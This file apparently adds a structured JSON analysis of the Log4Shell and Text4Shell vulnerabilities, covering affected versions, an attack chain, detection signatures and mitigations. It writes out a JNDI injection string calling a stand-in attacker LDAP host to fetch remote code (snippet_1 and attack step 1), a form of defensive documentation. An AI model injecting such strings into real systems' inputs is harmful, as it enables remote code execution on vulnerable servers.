@@ -1,0 +1,106 @@
+{
+  "package_info": {
+    "package_name": "log4j",
+    "package_manager": "Maven Central",
+    "package_versions": "2.0-beta9 through 2.17.0 (excluding 2.12.3 and 2.3.1); fixed in 2.17.1",
+    "why_malicious": "The affected versions of Log4j contain a critical vulnerability (Log4Shell) that allows attackers to trigger remote code execution by injecting specially crafted strings into log messages. These strings are interpreted and executed via JNDI lookups, enabling attackers to execute arbitrary code on vulnerable systems. This makes the package, as shipped in these versions, highly exploitable and dangerous for any application that processes untrusted log data."
+  },
+  "malicious_snippets": [
+    {
+      "snippet_id": "snippet_1",
+      "execution_context": {
+        "trigger": "runtime (when a log message containing a JNDI pattern is processed)",
+        "file_location": "org.apache.logging.log4j.core.pattern.PatternLayout (message interpolation logic in Log4j internals)",
+        "required_permissions": [
+          "network",
+          "environment_vars",
+          "JNDI access"
+        ]
+      },
+      "code_snippet": "${jndi:ldap://malicious.com/malwarepayload}",
+      "code_language": "java (expression interpreted by Log4j)",
+      "code_behavior": "At runtime, when a log message containing a JNDI lookup pattern is processed, Log4j interprets the pattern, initiates a network request via JNDI to the specified LDAP server, retrieves and deserializes remote code, resulting in execution of attacker-controlled code on the vulnerable server.",
+      "malice_analysis": {
+        "why_suspicious": "This behavior allows untrusted user input in log messages to trigger outbound network requests and load/execute remote code via JNDI, which is a direct remote code execution vector.",
+        "violated_expectations": "Logging libraries are expected to treat log messages as inert data and never execute or resolve expressions that can trigger network activity or code execution. Allowing log message content to initiate JNDI lookups violates this core security expectation.",
+        "similar_legitimate_use": "JNDI lookups are legitimate in tightly controlled, internal Java applications for resource discovery, but should never be triggered by untrusted log message content or user input.",
+        "key_indicators": [
+          "Log message interpolation triggers outbound JNDI/LDAP requests",
+          "Presence of ${jndi: patterns in log messages",
+          "Deserialization and execution of remote objects from untrusted sources during log processing",
+          "Unexpected network activity originating from logging components"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_2",
+      "execution_context": {
+        "trigger": "runtime (when variable interpolation is performed on user-supplied input)",
+        "file_location": "org.apache.commons.text.lookup.StringLookup (Commons Text interpolation logic)",
+        "required_permissions": [
+          "network",
+          "environment_vars"
+        ]
+      },
+      "code_snippet": "${prefix:name}",
+      "code_language": "java (expression interpreted by Commons Text)",
+      "code_behavior": "At runtime, when variable interpolation is performed on user-supplied input, the code evaluates the pattern, which can trigger a lookup (such as DNS, URL, or script execution) depending on the attacker-controlled prefix, potentially resulting in remote code execution or data exfiltration.",
+      "malice_analysis": {
+        "why_suspicious": "Allowing arbitrary variable interpolation with attacker-controlled prefixes enables attackers to trigger network requests or execute scripts, leading to code execution or data leakage.",
+        "violated_expectations": "Variable interpolation should be limited to safe, predefined lookups and must not allow arbitrary network or script execution based on untrusted input.",
+        "similar_legitimate_use": "Variable interpolation is common in configuration files for substituting environment variables or static values, but should be restricted to safe, non-executable operations.",
+        "key_indicators": [
+          "Unrestricted variable interpolation with attacker-controlled prefixes",
+          "Presence of ${prefix: patterns in configuration or log processing",
+          "Network or script execution triggered by string patterns in user input",
+          "Unexpected outbound network requests during variable interpolation"
+        ]
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "action": "Attacker injects a specially crafted string (e.g., ${jndi:ldap://malicious.com/malwarepayload}) into any input that will be logged by the vulnerable application.",
+      "implemented_by": [
+        "snippet_1"
+      ],
+      "leads_to": "Log4j processes the log message and triggers a JNDI lookup to the attacker-controlled server."
+    },
+    {
+      "step": 2,
+      "action": "Log4j performs a JNDI lookup to the attacker-controlled LDAP server, retrieves and deserializes malicious code.",
+      "implemented_by": [
+        "snippet_1"
+      ],
+      "leads_to": "Remote code execution on the vulnerable server, allowing the attacker to run arbitrary code."
+    },
+    {
+      "step": 3,
+      "action": "In the case of Commons Text (Text4Shell), attacker supplies a string with a malicious prefix to trigger variable interpolation and potentially remote code execution.",
+      "implemented_by": [
+        "snippet_2"
+      ],
+      "leads_to": "Potential execution of attacker-controlled code or exfiltration of sensitive data via network requests."
+    }
+  ],
+  "detection_knowledge": {
+    "behavioral_signatures": [
+      "Log message processing triggers outbound JNDI/LDAP/DNS/HTTP requests from application servers",
+      "Unexpected variable interpolation in log or configuration processing, especially with attacker-controlled prefixes",
+      "Deserialization of remote objects during log processing or variable interpolation",
+      "Presence of ${jndi: or ${prefix: patterns in log messages or configuration files"
+    ],
+    "file_indicators": [
+      "Presence of vulnerable Log4j versions (2.0-beta9 through 2.17.0, except 2.12.3 and 2.3.1) in dependency manifests (e.g., pom.xml, build.gradle)",
+      "Presence of vulnerable Apache Commons Text versions (before 1.10.0) in dependency manifests",
+      "Log or configuration files containing ${jndi: or ${prefix: patterns"
+    ],
+    "network_indicators": [
+      "Outbound LDAP, RMI, or HTTP requests to untrusted or external domains during log or configuration processing",
+      "Unexpected DNS lookups or connections to attacker infrastructure originating from application servers",
+      "Network activity to domains such as malicious.com or other attacker-controlled infrastructure"
+    ],
+    "how_to_detect": "Monitor application logs and network traffic for patterns such as ${jndi: or ${prefix: in log messages or configuration files. Alert on outbound LDAP, RMI, or HTTP requests originating from log processing or variable interpolation components. Scan dependency manifests for vulnerable versions of Log4j and Apache Commons Text. Use runtime instrumentation or web application firewall (WAF) rules to block or sanitize suspicious variable interpolation patterns. Implement strict allowlists for variable interpolation prefixes and disable JNDI lookups in logging frameworks where possible."
+  }
+}
